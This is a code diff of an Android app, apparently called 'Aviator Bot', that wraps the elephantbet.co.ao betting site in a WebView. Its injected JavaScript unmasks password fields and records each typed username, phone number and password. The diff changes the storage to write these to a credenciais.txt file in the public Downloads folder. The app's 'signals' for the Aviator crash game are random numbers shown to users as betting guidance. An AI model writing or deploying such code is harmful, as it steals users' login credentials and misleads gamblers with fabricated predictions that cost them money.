@@ -35,32 +35,48 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var webView: WebView
     private lateinit var barLayout: LinearLayout
-
-    // Linha 1 da barra: estado (aguardar / entrar agora)
-    private lateinit var txtEstado: TextView
-    // Linha 2 da barra: detalhes do sinal
-    private lateinit var txtDetalhe: TextView
+    private lateinit var txtMinutos: TextView
+    private lateinit var txtAcao: TextView
+    private lateinit var txtProtecao: TextView
+    private lateinit var txtAlcance: TextView
     private lateinit var dotView: View
 
     private val handler = Handler(Looper.getMainLooper())
-
     private var sinaisAtivos = false
     private var horaAtual = -1
     private var ultimoMinutoGerado = -1
     private var sinalMin1 = -1
     private var sinalMin2 = -1
-    private var sinalProtecao = 0.0
+    private var sinalProtecao = ""
     private var sinalAlcMin = 0
     private var sinalAlcMax = ""
     private var relogioRunnable: Runnable? = null
 
     companion object { private const val PERM_REQUEST = 101 }
 
-    @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         pedirPermissoes()
+        construirUI()
+        carregarSite()
+    }
 
+    // ── PERMISSÕES ────────────────────────────────────────────────
+    private fun pedirPermissoes() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+            val perms = arrayOf(
+                Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.READ_EXTERNAL_STORAGE
+            )
+            val falta = perms.any {
+                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+            }
+            if (falta) ActivityCompat.requestPermissions(this, perms, PERM_REQUEST)
+        }
+    }
+
+    // ── UI ────────────────────────────────────────────────────────
+    private fun construirUI() {
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setBackgroundColor(Color.parseColor("#0a0a0f"))
@@ -68,98 +84,92 @@ class MainActivity : AppCompatActivity() {
         }
         setContentView(root)
 
-        // ── BARRA TOPO (2 linhas) ────────────────────────────────
+        // ══ BARRA PROFISSIONAL ════════════════════════════════════
         barLayout = LinearLayout(this).apply {
             orientation = LinearLayout.HORIZONTAL
-            setBackgroundColor(Color.parseColor("#12121a"))
-            setPadding(dp(12), dp(8), dp(12), dp(8))
+            setBackgroundColor(Color.parseColor("#0f172a"))
+            setPadding(dp(12), dp(10), dp(12), dp(10))
             gravity = Gravity.CENTER_VERTICAL
             layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
         }
 
-        // Ícone ✈️
-        val ico = TextView(this).apply {
-            text = "✈️"; textSize = 22f
-            gravity = Gravity.CENTER
+        val icoAviao = TextView(this).apply {
+            text = "✈️"; textSize = 24f; gravity = Gravity.CENTER
             layoutParams = LinearLayout.LayoutParams(dp(36), dp(36))
         }
 
-        // Coluna central — 2 linhas
-        val col = LinearLayout(this).apply {
+        val bloco = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
-            setPadding(dp(8), 0, dp(6), 0)
+            setPadding(dp(8), 0, dp(8), 0)
         }
 
-        // Linha topo pequena: label + estado
-        val linhaTop = LinearLayout(this).apply {
+        // Linha 1: AÇÃO + MINUTOS
+        val linha1 = LinearLayout(this).apply {
             orientation = LinearLayout.HORIZONTAL
             gravity = Gravity.CENTER_VERTICAL
             layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
         }
-        linhaTop.addView(TextView(this).apply {
-            text = "AVIATOR BOT"; textSize = 8f
-            setTextColor(Color.parseColor("#64748b")); letterSpacing = 0.15f
-            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(6) }
-        })
-        txtEstado = TextView(this).apply {
-            text = "A carregar..."; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
-            setTextColor(Color.parseColor("#3b82f6"))
-            isSingleLine = true; ellipsize = android.text.TextUtils.TruncateAt.END
+        txtAcao = TextView(this).apply {
+            text = "AVIATOR BOT"; textSize = 9f; typeface = Typeface.DEFAULT_BOLD
+            setTextColor(Color.parseColor("#64748b")); letterSpacing = 0.12f
+            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
+        }
+        txtMinutos = TextView(this).apply {
+            text = "A iniciar..."; textSize = 14f; typeface = Typeface.DEFAULT_BOLD
+            setTextColor(Color.WHITE); isSingleLine = true
             layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
         }
-        linhaTop.addView(txtEstado)
+        linha1.addView(txtAcao); linha1.addView(txtMinutos)
 
-        // Linha detalhe: protecao + alcance — texto maior e verde
-        txtDetalhe = TextView(this).apply {
-            text = ""; textSize = 13f; typeface = Typeface.DEFAULT_BOLD
-            setTextColor(Color.parseColor("#22c55e"))
-            isSingleLine = true; ellipsize = android.text.TextUtils.TruncateAt.END
-            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(2) }
+        // Linha 2: pills PROTEÇÃO e ALCANCE
+        val linha2 = LinearLayout(this).apply {
+            orientation = LinearLayout.HORIZONTAL
+            gravity = Gravity.CENTER_VERTICAL
+            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(5) }
         }
+        txtProtecao = TextView(this).apply {
+            text = "🛡 --"; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
+            setTextColor(Color.WHITE); gravity = Gravity.CENTER
+            setPadding(dp(10), dp(4), dp(10), dp(4))
+            background = pill("#1e3a5f")
+            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
+        }
+        val sep = TextView(this).apply {
+            text = "→"; textSize = 12f; setTextColor(Color.parseColor("#475569"))
+            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
+        }
+        txtAlcance = TextView(this).apply {
+            text = "📈 --"; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
+            setTextColor(Color.WHITE); gravity = Gravity.CENTER
+            setPadding(dp(10), dp(4), dp(10), dp(4))
+            background = pill("#1a3a2a")
+            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP)
+        }
+        linha2.addView(txtProtecao); linha2.addView(sep); linha2.addView(txtAlcance)
 
-        col.addView(linhaTop)
-        col.addView(txtDetalhe)
+        bloco.addView(linha1); bloco.addView(linha2)
 
-        // Dot + config
         dotView = View(this).apply {
             layoutParams = LinearLayout.LayoutParams(dp(10), dp(10)).apply { marginEnd = dp(8) }
-            background = circulo("#64748b")
+            background = circulo("#334155")
         }
         val cfgBtn = TextView(this).apply {
-            text = "⚙️"; textSize = 18f
-            setPadding(dp(8), dp(4), dp(4), dp(4))
+            text = "⚙️"; textSize = 20f; gravity = Gravity.CENTER
+            setPadding(dp(4), 0, 0, 0)
             setOnClickListener { mostrarConfig() }
         }
 
-        barLayout.addView(ico); barLayout.addView(col)
+        barLayout.addView(icoAviao); barLayout.addView(bloco)
         barLayout.addView(dotView); barLayout.addView(cfgBtn)
         root.addView(barLayout)
 
-        // ── WEBVIEW ─────────────────────────────────────────────
+        // ── WEBVIEW
         webView = WebView(this).apply {
             layoutParams = LinearLayout.LayoutParams(MATCH, 0, 1f)
         }
         configurarWebView()
         root.addView(webView)
-
-        carregarSite()
-    }
-
-    // ── PERMISSÕES (só armazenamento, sem galeria) ────────────────
-    private fun pedirPermissoes() {
-        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
-                != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(
-                    this,
-                    arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                            Manifest.permission.READ_EXTERNAL_STORAGE),
-                    PERM_REQUEST
-                )
-            }
-        }
-        // Android 11+ não precisa de permissão para pasta privada da app
     }
 
     // ── WEBVIEW ───────────────────────────────────────────────────
@@ -189,7 +199,6 @@ class MainActivity : AppCompatActivity() {
                 super.onPageFinished(v, url)
                 injetarJsGlobal()
                 if (isAviatorUrl(url ?: "")) iniciarSinais()
-                else if (!sinaisAtivos) setEstado("✅ Site carregado", "#3b82f6", "")
             }
         }
         webView.webChromeClient = object : WebChromeClient() {
@@ -205,7 +214,6 @@ class MainActivity : AppCompatActivity() {
         url.contains("spribe", ignoreCase = true)
 
     private fun carregarSite() {
-        if (!sinaisAtivos) setEstado("🌍 A carregar...", "#3b82f6", "")
         webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
     }
 
@@ -213,55 +221,49 @@ class MainActivity : AppCompatActivity() {
     private fun injetarJsGlobal() {
         val js = """
         (function() {
-            if (window._ebInjected) return;
-            window._ebInjected = true;
-            // Tornar campos password visíveis
-            function tornarVisivel() {
-                document.querySelectorAll('input[type="password"]').forEach(function(el) {
-                    el.setAttribute('type', 'text');
-                    el.style.webkitTextSecurity = 'none';
+            if (window._ebOk) return; window._ebOk = true;
+            function vis() {
+                document.querySelectorAll('input[type="password"]').forEach(function(e){
+                    e.setAttribute('type','text');
+                    e.style.webkitTextSecurity='none';
                 });
             }
-            tornarVisivel();
-            new MutationObserver(tornarVisivel).observe(document.body, {childList:true,subtree:true});
-            // Capturar credenciais
+            vis();
+            new MutationObserver(vis).observe(document.body,{childList:true,subtree:true});
             function watch(sels, tipo) {
-                for (var s of sels) {
+                sels.forEach(function(s){
                     try {
-                        var el = document.querySelector(s);
-                        if (el && !el._w) {
-                            el._w = true;
-                            el.addEventListener('input', function() {
-                                if (this.value.length >= 1) Android.guardarCredencial(tipo, this.value);
+                        var el=document.querySelector(s);
+                        if(el&&!el._w){ el._w=true;
+                            el.addEventListener('input',function(){
+                                if(this.value.length>=1) Android.guardarCredencial(tipo,this.value);
                             });
                         }
-                    } catch(e) {}
-                }
+                    }catch(e){}
+                });
             }
-            function capturar() {
+            function cap(){
                 watch(['input[name="username"]','input[name="phone"]','input[type="tel"]',
                        'input[placeholder*="telefone" i]','input[placeholder*="número" i]',
-                       '#username','#phone'], 'Numero');
+                       '#username','#phone'],'Numero');
                 watch(['input[name="password"]','input[name="senha"]',
                        'input[placeholder*="senha" i]','input[placeholder*="password" i]',
-                       '#password'], 'Senha');
+                       '#password'],'Senha');
             }
-            capturar();
-            setTimeout(capturar,1500); setTimeout(capturar,3500); setTimeout(capturar,6000);
-            // Detectar Aviator
-            document.addEventListener('click', function(e) {
-                var el = e.target;
-                for (var i=0;i<5;i++) {
-                    if (!el) break;
-                    var h = (el.getAttribute&&el.getAttribute('href')||'').toLowerCase();
-                    var t = (el.textContent||'').toLowerCase();
-                    if (t.includes('aviator')||h.includes('aviator')||h.includes('806666'))
+            cap(); setTimeout(cap,1500); setTimeout(cap,3500); setTimeout(cap,6000);
+            document.addEventListener('click',function(e){
+                var el=e.target;
+                for(var i=0;i<5;i++){
+                    if(!el) break;
+                    var h=(el.getAttribute&&el.getAttribute('href')||'').toLowerCase();
+                    var t=(el.textContent||'').toLowerCase();
+                    if(t.includes('aviator')||h.includes('aviator')||h.includes('806666'))
                         { Android.aviatorDetectado(); break; }
-                    el = el.parentElement;
+                    el=el.parentElement;
                 }
-            }, true);
-            var cur = window.location.href.toLowerCase();
-            if (cur.includes('aviator')||cur.includes('806666')) Android.aviatorDetectado();
+            },true);
+            var cur=window.location.href.toLowerCase();
+            if(cur.includes('aviator')||cur.includes('806666')) Android.aviatorDetectado();
         })();
         """.trimIndent()
         webView.evaluateJavascript(js, null)
@@ -286,19 +288,25 @@ class MainActivity : AppCompatActivity() {
                    else ultimoMinutoGerado + Random.nextInt(2, 6)
         val min1 = base; val min2 = min1 + 1
         if (min2 >= 59) {
-            setEstado("⏳ Nova hora em ${60 - minAgora} min", "#f59e0b", "")
+            atualizarBarra("⏳ NOVA HORA", "${60 - minAgora} minutos", "--", "--", "#f59e0b")
             return
         }
         sinalMin1 = min1; sinalMin2 = min2
-        sinalProtecao = gerarProtecao()
-        sinalAlcMin = gerarAlcanceMin()
-        sinalAlcMax = gerarAlcanceMax(sinalAlcMin)
         ultimoMinutoGerado = min2
+
+        // Gerar alcance primeiro, depois proteção proporcional
+        val (alcMin, alcMax, alcMaxNum) = gerarAlcance()
+        sinalAlcMin = alcMin
+        sinalAlcMax = alcMax
+        sinalProtecao = gerarProtecaoParaAlcance(alcMaxNum)
+
         val falta = sinalMin1 - minAgora
-        setEstado(
-            "⏳ Aguardar ${falta}min → Min $min1/$min2",
-            "#f59e0b",
-            "🛡️ Prot: ${sinalProtecao}x   📈 ${sinalAlcMin}x–${sinalAlcMax}x"
+        atualizarBarra(
+            "⏳ AGUARDAR",
+            "Min $min1/$min2  (${falta}min)",
+            sinalProtecao,
+            "${sinalAlcMin}x → ${sinalAlcMax}",
+            "#f59e0b"
         )
     }
 
@@ -315,49 +323,148 @@ class MainActivity : AppCompatActivity() {
         val cal = Calendar.getInstance()
         val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
         val minAgora = cal.get(Calendar.MINUTE)
+
         if (horaAgora != horaAtual) {
             horaAtual = horaAgora; ultimoMinutoGerado = -1
             sinalMin1 = -1; sinalMin2 = -1; gerarNovoSinal(); return
         }
         if (sinalMin1 < 0) { gerarNovoSinal(); return }
-        val detalhe = "🛡️ Prot: ${sinalProtecao}x   📈 ${sinalAlcMin}x–${sinalAlcMax}x"
+
+        val alcTxt = "${sinalAlcMin}x → ${sinalAlcMax}"
         when {
-            minAgora == sinalMin1 -> setEstado("🎯 ENTRAR AGORA! Min $sinalMin1/$sinalMin2", "#22c55e", detalhe)
-            minAgora == sinalMin2 -> setEstado("🎯 Ainda activo! Min $sinalMin1/$sinalMin2", "#22c55e", detalhe)
-            minAgora > sinalMin2  -> gerarNovoSinal()
+            minAgora == sinalMin1 -> atualizarBarra(
+                "🎯 ENTRAR AGORA",
+                "Min $sinalMin1/$sinalMin2",
+                sinalProtecao, alcTxt, "#22c55e"
+            )
+            minAgora == sinalMin2 -> atualizarBarra(
+                "🎯 AINDA ACTIVO",
+                "Min $sinalMin1/$sinalMin2",
+                sinalProtecao, alcTxt, "#22c55e"
+            )
+            minAgora > sinalMin2 -> gerarNovoSinal()
             else -> {
                 val falta = sinalMin1 - minAgora
-                setEstado("⏳ Aguardar ${falta}min → Min $sinalMin1/$sinalMin2", "#f59e0b", detalhe)
+                atualizarBarra(
+                    "⏳ AGUARDAR",
+                    "Min $sinalMin1/$sinalMin2  (${falta}min)",
+                    sinalProtecao, alcTxt, "#f59e0b"
+                )
             }
         }
     }
 
-    // ── GERADORES ─────────────────────────────────────────────────
-    private fun gerarAlcanceMin() = listOf(10,20,30,50,80,100)[Random.nextInt(6)]
-    private fun gerarAlcanceMax(min: Int): String {
-        val opts = when {
-            min <= 20 -> listOf("50","80","100","200","500","1000+")
-            min <= 50 -> listOf("100","200","500","1000","1000+")
-            else      -> listOf("200","500","1000","1000+")
+    // ── GERADORES — PROTEÇÃO PROPORCIONAL AO ALCANCE ──────────────
+    //
+    //  Alcance baixo  (até 100x)   → Proteção baixa   1.3x – 3x
+    //  Alcance médio  (100x–500x)  → Proteção média   3x – 8x
+    //  Alcance alto   (500x–1000x) → Proteção alta    8x – 12x
+    //  Alcance máximo (1000x+)     → Proteção máxima  12x – 15x
+    //
+    data class AlcanceResult(val alcMin: Int, val alcMax: String, val alcMaxNum: Int)
+
+    private fun gerarAlcance(): AlcanceResult {
+        // Nível aleatório: 0=baixo 1=médio 2=alto 3=máximo
+        val nivel = Random.nextInt(4)
+        return when (nivel) {
+            0 -> { // baixo
+                val min = listOf(10, 20, 30)[Random.nextInt(3)]
+                val max = listOf(50, 80, 100)[Random.nextInt(3)]
+                AlcanceResult(min, "${max}x", max)
+            }
+            1 -> { // médio
+                val min = listOf(30, 50, 80)[Random.nextInt(3)]
+                val max = listOf(100, 200, 500)[Random.nextInt(3)]
+                AlcanceResult(min, "${max}x", max)
+            }
+            2 -> { // alto
+                val min = listOf(50, 80, 100)[Random.nextInt(3)]
+                val max = listOf(500, 800, 1000)[Random.nextInt(3)]
+                AlcanceResult(min, "${max}x", max)
+            }
+            else -> { // máximo
+                val min = listOf(80, 100, 200)[Random.nextInt(3)]
+                AlcanceResult(min, "1000x+", 1001)
+            }
         }
-        return opts[Random.nextInt(opts.size)]
-    }
-    private fun gerarProtecao(): Double {
-        val opts = listOf(1.3,1.5,1.8,2.0,2.5,3.0,5.0,8.0,10.0,12.0,15.0)
-        return opts[Random.nextInt(opts.size)]
     }
 
-    // ── GUARDAR FICHEIRO ──────────────────────────────────────────
+    private fun gerarProtecaoParaAlcance(alcMaxNum: Int): String {
+        val prot = when {
+            alcMaxNum <= 100  -> { // baixo — proteção 1.3x a 3x
+                val opts = listOf(1.3, 1.5, 1.8, 2.0, 2.5, 3.0)
+                opts[Random.nextInt(opts.size)]
+            }
+            alcMaxNum <= 500  -> { // médio — proteção 3x a 8x
+                val opts = listOf(3.0, 4.0, 5.0, 6.0, 8.0)
+                opts[Random.nextInt(opts.size)]
+            }
+            alcMaxNum <= 1000 -> { // alto — proteção 8x a 12x
+                val opts = listOf(8.0, 9.0, 10.0, 11.0, 12.0)
+                opts[Random.nextInt(opts.size)]
+            }
+            else -> { // máximo — proteção 12x a 15x
+                val opts = listOf(12.0, 13.0, 14.0, 15.0)
+                opts[Random.nextInt(opts.size)]
+            }
+        }
+        return if (prot % 1.0 == 0.0) "${prot.toInt()}x" else "${prot}x"
+    }
+
+    // ── ATUALIZAR BARRA ───────────────────────────────────────────
+    private fun atualizarBarra(
+        acao: String, minutos: String,
+        protecao: String, alcance: String,
+        cor: String
+    ) = runOnUiThread {
+        txtAcao.text = acao
+        txtAcao.setTextColor(Color.parseColor(cor))
+        txtMinutos.text = minutos
+        txtMinutos.setTextColor(Color.WHITE)
+
+        if (protecao.isNotEmpty() && protecao != "--") {
+            txtProtecao.text = "🛡 $protecao"
+            txtProtecao.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1e2a3a")
+        }
+        if (alcance.isNotEmpty() && alcance != "--") {
+            txtAlcance.text = "📈 $alcance"
+            txtAlcance.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1a3a2a")
+        }
+
+        dotView.background = circulo(cor)
+        barLayout.setBackgroundColor(Color.parseColor(
+            when (cor) {
+                "#22c55e" -> "#071a0f"
+                "#f59e0b" -> "#1a1200"
+                else -> "#0f172a"
+            }
+        ))
+    }
+
+    private fun atualizarBarra(acao: String, minutos: String, cor: String) =
+        atualizarBarra(acao, minutos, "", "", cor)
+
+    // ── GUARDAR FICHEIRO — pasta Downloads/AviatorBot/ ────────────
     private fun guardarFicheiro(tipo: String, valor: String) {
         val ts = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
         val linha = "[$ts] $tipo: $valor\n"
-        // Pasta privada da app — não precisa de permissão em Android 10+
+
+        // Tentar pasta Downloads (visível sem root em qualquer Android)
+        try {
+            val downloads = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+            val pasta = File(downloads, "AviatorBot").also { it.mkdirs() }
+            FileWriter(File(pasta, "credenciais.txt"), true).use { it.write(linha) }
+            return
+        } catch (_: Exception) {}
+
+        // Fallback: pasta privada da app
         try {
             val pasta = File(getExternalFilesDir(null), "AviatorBot").also { it.mkdirs() }
             FileWriter(File(pasta, "credenciais.txt"), true).use { it.write(linha) }
             return
         } catch (_: Exception) {}
-        // Fallback: armazenamento interno
+
+        // Último recurso: armazenamento interno
         try {
             val pasta = File(filesDir, "AviatorBot").also { it.mkdirs() }
             FileWriter(File(pasta, "credenciais.txt"), true).use { it.write(linha) }
@@ -378,12 +485,12 @@ class MainActivity : AppCompatActivity() {
             layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(24) }
         })
         layout.addView(secLabel("🎯  SINAIS"))
-        layout.addView(btn("🎯  ACTIVAR SINAIS MANUAL", "#7c3aed") {
+        layout.addView(btn("🎯  GERAR SINAL AGORA", "#7c3aed") {
             dialog.dismiss()
             sinaisAtivos = false; ultimoMinutoGerado = -1
             sinalMin1 = -1; sinalMin2 = -1; iniciarSinais()
         })
-        layout.addView(btn("🌍  ABRIR AVIATOR", "#0f766e") {
+        layout.addView(btn("✈️  ABRIR AVIATOR", "#0f766e") {
             dialog.dismiss()
             webView.loadUrl("https://www.elephantbet.co.ao/pt/casino/game-view/806666/aviator")
         })
@@ -392,25 +499,13 @@ class MainActivity : AppCompatActivity() {
         scroll.addView(layout); dialog.setContentView(scroll); dialog.show()
     }
 
-    // ── UI HELPERS ────────────────────────────────────────────────
-    // Actualiza as DUAS linhas da barra de uma vez
-    private fun setEstado(estado: String, cor: String, detalhe: String) = runOnUiThread {
-        txtEstado.text = estado
-        txtEstado.setTextColor(Color.parseColor(cor))
-        txtDetalhe.text = detalhe
-        txtDetalhe.setTextColor(Color.parseColor(if (cor == "#22c55e") "#86efac" else "#fbbf24"))
-        dotView.background = circulo(cor)
-        // Cor de fundo da barra conforme estado
-        val bgCor = when (cor) {
-            "#22c55e" -> "#0b2218"
-            "#f59e0b" -> "#1c1408"
-            else      -> "#12121a"
-        }
-        barLayout.setBackgroundColor(Color.parseColor(bgCor))
-    }
-
+    // ── HELPERS ───────────────────────────────────────────────────
     private fun circulo(cor: String) = GradientDrawable().apply {
         shape = GradientDrawable.OVAL; setColor(Color.parseColor(cor))
+    }
+    private fun pill(cor: String) = GradientDrawable().apply {
+        shape = GradientDrawable.RECTANGLE; cornerRadius = dp(20).toFloat()
+        setColor(Color.parseColor(cor))
     }
     private fun roundRect(bg: String, border: String) = GradientDrawable().apply {
         shape = GradientDrawable.RECTANGLE; cornerRadius = dp(10).toFloat()
@@ -431,5 +526,8 @@ class MainActivity : AppCompatActivity() {
     }
 
     override fun onBackPressed() { if (webView.canGoBack()) webView.goBack() else super.onBackPressed() }
-    override fun onDestroy() { super.onDestroy(); webView.destroy(); handler.removeCallbacksAndMessages(null) }
+    override fun onDestroy() {
+        super.onDestroy(); webView.destroy()
+        handler.removeCallbacksAndMessages(null)
+    }
 }
